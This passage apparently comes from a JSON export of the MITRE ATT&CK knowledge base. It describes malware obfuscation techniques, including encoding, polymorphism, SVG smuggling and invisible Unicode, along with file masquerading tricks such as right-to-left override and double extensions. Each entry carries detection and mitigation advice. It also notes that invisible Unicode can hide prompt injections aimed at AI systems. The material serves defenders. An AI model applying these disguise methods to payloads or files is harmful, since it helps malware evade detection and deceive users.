other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. <a href=\"https://www.crowdstrike.com/blog/shlayer-malvertising-campaigns-still-using-flash-update-disguise/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: File obfuscation)</a> Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). <a href=\"https://www.crowdstrike.com/blog/self-extracting-archives-decoy-files-and-their-hidden-payloads/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SFX - Encrypted/Encoded File)</a> \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","File: File Metadata"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10+, enable Attack Surface Reduction (ASR) rules to block execution of potentially obfuscated scripts. <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-execution-of-potentially-obfuscated-scripts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Obfuscated scripts)</a>\n\nSecurity tools should be configured to analyze the encoding properties of files and detect anomalies that deviate from standard encoding practices."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files, including those with high entropy measurements or with otherwise potentially malicious signs of obfuscation."}]},{"id":"T1027.014","name":"Polymorphic Code","description":"Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution. <a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/polymorphic-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: polymorphic-blackberry)</a> With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools. <a href=\"https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-is-polymorphic-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: polymorphic-sentinelone)</a> \nOther obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as Software Packing, Command Obfuscation, or Encrypted/Encoded File. <a href=\"https://www.linkedin.com/pulse/techniques-concealing-malware-hindering-analysis-packing-akshay-unijc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: polymorphic-linkedin)</a> <a href=\"https://medium.com/@shellseekerscyber/explainer-packed-malware-16f09cc75035\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: polymorphic-medium)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Application Log: Application Log Content","File: File Creation","File: File Metadata"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10+, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated payloads"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files. Employment of advanced anti-malware techniques that make use of technologies like machine learning and behavior-based mechanisms to conduct signature-less malware detection will also be more effective than traditional indicator-based detection methods."}]},{"id":"T1027.015","name":"Compression","description":"Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., Fileless Storage). <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pillowmint-fin7s-monkey-thief/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trustwave Pillowmint June 2020)</a>\n\nIn order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload. <a href=\"https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Perception Point)</a>\n\nFile archives may be sent as one Spearphishing Attachment through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., Malicious File). <a href=\"https://insight-jp.nttsecurity.com/post/102hf3q/flagpro-the-new-malware-used-by-blacktech\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NTT Security Flagpro new December 2021)</a> However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user. <a href=\"https://thehackernews.com/2023/04/hackers-using-self-extracting-archives.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The Hacker News)</a>\n\nCompression may be used in combination with Encrypted/Encoded File where compressed files are encrypted and password-protected.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files. Consider anti-virus products capable of unpacking and inspecting compressed files recursively, as well as analyzing SFX archives."}]},{"id":"T1027.016","name":"Junk Code Insertion","description":"Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with Compression or Software Packing. <a href=\"https://cyberpedia.reasonlabs.com/EN/dead%20code%20insertion.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ReasonLabs)</a> <a href=\"https://cyberpedia.reasonlabs.com/EN/junk%20code.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ReasonLabs Cyberpedia Junk Code)</a>\n\nNo-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them. <a href=\"https://cyberpedia.reasonlabs.com/EN/dead%20code%20insertion.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ReasonLabs)</a>\n\nThe use of junk / dead code insertion is distinct from Binary Padding because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files. Behavior-based detections, rather than reliance on static code analysis, may help to identify malicious files that rely heavily on junk code. <a href=\"https://cyberpedia.reasonlabs.com/EN/dead%20code%20insertion.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ReasonLabs)</a>"}]},{"id":"T1027.017","name":"SVG Smuggling","description":"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files. <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pixel-perfect-trap-the-surge-of-svg-borne-phishing-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trustwave SVG Smuggling 2025)</a> SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include <code>&lt;script&gt;</code> tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. \n\nSVG smuggling can take a number of forms. For example, threat actors may include content that: \n\n* Assembles malicious payloads <a href=\"https://blog.talosintelligence.com/html-smugglers-turn-to-svg-images/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos SVG Smuggling 2022)</a>\n* Downloads malicious payloads <a href=\"https://cofense.com/blog/svg-files-abused-in-emerging-campaigns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cofense SVG Smuggling 2024)</a>\n* Redirects users to malicious websites <a href=\"https://www.bleepingcomputer.com/news/security/phishing-emails-increasingly-use-svg-attachments-to-evade-detection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer SVG Smuggling 2024)</a>\n* Displays interactive content to users, such as fake login forms and download buttons. <a href=\"https://www.bleepingcomputer.com/news/security/phishing-emails-increasingly-use-svg-attachments-to-evade-detection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer SVG Smuggling 2024)</a>\n\nSVG Smuggling may be used in conjunction with HTML Smuggling where an SVG with a malicious payload is included inside an HTML file. <a href=\"https://blog.talosintelligence.com/html-smugglers-turn-to-svg-images/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos SVG Smuggling 2022)</a> SVGs may also be included in other types of documents, such as PDFs.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist."}]},{"id":"T1027.018","name":"Invisible Unicode","description":"Adversaries may abuse invisible or non-printing Unicode characters to conceal malicious content within files, scripts, or text. By inserting characters that do not visibly render, adversaries may hide data, alter how content is interpreted, or make malicious code appear as benign text or whitespace. Adversaries may encode these malicious payloads, using binary, Base64, or custom schemes, to be reconstructed at runtime through scripting features such as JavaScript Proxy traps, <code>eval()</code>, or other dynamic execution methods. This technique enables adversaries to evade visual inspection and basic static analysis by hiding malicious encoded content in innocuous text. <a href=\"https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PUAs Unicode - Eriksen)</a> <a href=\"https://www.levelblue.com/blogs/spiderlabs-blog/tycoon2fa-new-evasion-technique-for-2025\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tycoon2FA - Unicode)</a> <a href=\"https://www.veracode.com/blog/down-the-rabbit-hole-of-unicode-obfuscation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unicode - Veracode)</a> \n\nUnicode is a standardized character encoding model that assigns a unique numerical value, known as a code point, to every character across writing systems, enabling consistent text representation across platforms, applications, and languages. Code points are represented as <code>U+</code> followed by a hexadecimal value and may be encoded using formats such as <code>UTF-8</code> or <code>UTF-16</code>. Adversaries may abuse the valid code points in Unicode that are not visibly rendered but still take up bytes, such as zero-width spaces, variation selectors, or bidirectional formatting controls, to conceal malicious payloads. <a href=\"https://www.levelblue.com/blogs/spiderlabs-blog/tycoon2fa-new-evasion-technique-for-2025\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tycoon2FA - Unicode)</a> <a href=\"https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace#heading-5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GlassWorm - Unicode)</a> <a href=\"https://cycode.com/blog/invisible-code-hidden-prompts-unicode-attacks-sast/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unicode and Hidden Prompts - Perets)</a>\n\nAdversaries may additionally exploit Private Use Area (PUA) characters, a range of code points reserved for custom assignment. PUA characters that are not defined by a font or application are typically rendered blank. <a href=\"https://www.aikido.dev/blog/youre-invited-delivering-malware-via-google-calendar-invites-and-puas\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PUAs Unicode - Eriksen)</a>\n\nUnicode characters may also be leveraged in support of other techniques such as Phishing, Right-to-Left Override, or User Execution. For example, some adversaries may embed artificial intelligence (AI) prompt injections using invisible Unicode characters in emails or documents that appear benign when processed by AI systems. <a href=\"https://idanhabler.medium.com/hiding-in-plain-sight-weaponizing-invisible-unicode-to-attack-llms-f9033865ec10\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LLMs and Unicode - Medium)</a> <a href=\"https://www.trendmicro.com/en_us/research/25/a/invisible-prompt-injection-secure-ai.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invisible Prompt Injection - Trend Micro)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[]}]},{"id":"T1036","name":"Masquerading","description":"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. <a href=\"https://lolbas-project.github.io/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Main Site)</a>","detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. <a href=\"https://www.elastic.co/blog/how-hunt-masquerade-ball\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Masquerade Ball)</a> Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. <a href=\"https://x.com/ItsReallyNick/status/1055321652777619457\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter ItsReallyNick Masquerading Update)</a>\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE”.","platforms":["Containers","ESXi","Linux","macOS","Windows"],"dataSources":["File: File Modification","Process: Process Metadata","Service: Service Creation","Service: Service Metadata","Process: Process Creation","Image: Image Metadata","Scheduled Job: Scheduled Job Metadata","User Account: User Account Creation","File: File Metadata","Scheduled Job: Scheduled Job Modification","Command: Command Execution","Process: OS API Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks."},{"id":"M1018","name":"User Account Management","description":"Consider defining and enforcing a naming convention for user accounts to more easily spot generic account names that do not fit the typical schema."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Use file system access controls to protect folders such as C:\\\\Windows\\\\System32."},{"id":"M1038","name":"Execution Prevention","description":"Use tools that restrict program execution via application control by attributes other than file name for common operating system utilities that are needed."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Implement security controls on the endpoint, such as a Host Intrusion Prevention System (HIPS), to identify and prevent execution of potentially malicious files (such as those with mismatching file signatures)."},{"id":"M1045","name":"Code Signing","description":"Require signed binaries."},{"id":"M1047","name":"Audit","description":"Audit user accounts to ensure that each one has a defined purpose."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}],"subTechniques":[{"id":"T1036.001","name":"Invalid Code Signature","description":"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files. <a href=\"https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threatexpress MetaTwin 2017)</a>\n\nUnlike Code Signing, this activity will not result in a valid signature.","detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.","platforms":["macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[{"id":"M1045","name":"Code Signing","description":"Require signed binaries."}]},{"id":"T1036.002","name":"Right-to-Left Override","description":"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. <a href=\"https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Infosecinstitute RTLO Technique)</a>\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro PLEAD RTLO)</a> <a href=\"https://securelist.com/zero-day-vulnerability-in-telegram/83800/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky RTLO Cyber Crime)</a> RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.","detection":"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1036.003","name":"Rename Legitimate Utilities","description":"Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython. <a href=\"https://lolbas-project.github.io/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Main Site)</a> <a href=\"https://www.huntress.com/blog/snakes-on-a-domain-an-analysis-of-a-python-malware-loader\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress Python Malware 2025)</a> <a href=\"https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The DFIR Report AutoHotKey 2023)</a> <a href=\"https://research.splunk.com/endpoint/683e6196-b8e8-11eb-9a79-acde48001122/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Detect Renamed PSExec)</a> It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). <a href=\"https://www.elastic.co/blog/how-hunt-masquerade-ball\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Masquerade Ball)</a> An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths. <a href=\"https://www.f-secure.com/documents/996508/1030745/CozyDuke\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: F-Secure CozyDuke)</a>","detection":"If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. <a href=\"https://www.elastic.co/blog/how-hunt-masquerade-ball\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Masquerade Ball)</a> Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. <a href=\"https://x.com/ItsReallyNick/status/1055321652777619457\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter ItsReallyNick Masquerading Update)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","Process: Process Metadata","Command: Command Execution","File: File Metadata"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Use file system access controls to protect folders such as <code>C:\\Windows\\System32</code>."}]},{"id":"T1036.004","name":"Masquerade Task or Service","description":"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. <a href=\"https://technet.microsoft.com/en-us/library/bb490996.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Schtasks)</a> <a href=\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Systemd Service Units)</a> Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate. <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://vms.drweb.com/virus/?i=4276269\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fysbis Dr Web Analysis)</a>","detection":"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","Windows"],"dataSources":["Scheduled Job: Scheduled Job Modification","Service: Service Creation","Command: Command Execution","Service: Service Metadata","Scheduled Job: Scheduled Job Metadata"],"mitigations":[]},{"id":"T1036.005","name":"Match Legitimate Resource Name or Location","description":"Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. \n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: <code>svchost.exe</code>). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster. <a href=\"https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Backdoor 2023)</a>","detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. <a href=\"https://www.elastic.co/blog/how-hunt-masquerade-ball\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Masquerade Ball)</a> Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. <a href=\"https://x.com/ItsReallyNick/status/1055321652777619457\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter ItsReallyNick Masquerading Update)</a>\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names. <a href=\"https://docs.docker.com/engine/reference/commandline/images/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Images)</a> Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.","platforms":["Containers","ESXi","Linux","macOS","Windows"],"dataSources":["File: File Metadata","Image: Image Metadata","Process: Process Metadata","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Use file system access controls to protect folders such as <code>C:\\Windows\\System32</code>."},{"id":"M1038","name":"Execution Prevention","description":"Use tools that restrict program execution via application control by attributes other than file name for common operating system utilities that are needed."},{"id":"M1045","name":"Code Signing","description":"Require signed binaries and images."}]},{"id":"T1036.006","name":"Space after Filename","description":"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed <a href=\"https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mac Backdoors are back)</a>.\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.","detection":"It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.","platforms":["Linux","macOS"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1036.007","name":"Double File Extension","description":"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies. <a href=\"https://www.pcmag.com/encyclopedia/term/double-extension\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PCMag DoubleExtension)</a> <a href=\"https://socprime.com/blog/rule-of-the-week-possible-malicious-file-double-extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SOCPrime DoubleExtension)</a> \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware. <a href=\"https://socprime.com/blog/rule-of-the-week-possible-malicious-file-double-extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SOCPrime DoubleExtension)</a>\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.","detection":"Monitor for files written to disk that contain two file extensions, particularly when the second is an executable. <a href=\"https://www.seqrite.com/blog/how-to-avoid-dual-attack-and-vulnerable-files-with-double-extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Seqrite DoubleExtension)</a>","platforms":["Windows"],"dataSources":["File: File Creation","File: File Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to look for double extensions in filenames, and in general use training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."},{"id":"M1028","name":"Operating System Configuration","description":"Disable the default to “hide file extensions for known file types” in Windows OS. <a href=\"https://www.seqrite.com/blog/how-to-avoid-dual-attack-and-vulnerable-files-with-double-extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Seqrite DoubleExtension)</a> <a href=\"https://www.howtogeek.com/205086/beginner-how-to-make-windows-show-file-extensions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HowToGeek ShowExtension)</a>"}]},{"id":"T1036.008","name":"Masquerade File Type","description":"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either <code>.JPE</code>, <code>.JPEG</code> or <code>.JPG</code>. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (<code>.txt</code>) and image files (<code>.jpg</code>, <code>.gif</code>, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolyglot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities. <a href=\"https://unit42.paloaltonetworks.com/polyglot-file-icedid-payload\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: polygot_icedID)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Ensure that input sanitization is performed and that files are validated properly before execution; furthermore, implement a strict allow list to ensure that only authorized file types are processed. <a href=\"https://blog.yeswehack.com/yeswerhackers/file-upload-attacks-part-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: file_upload_attacks_pt2)</a> Restrict 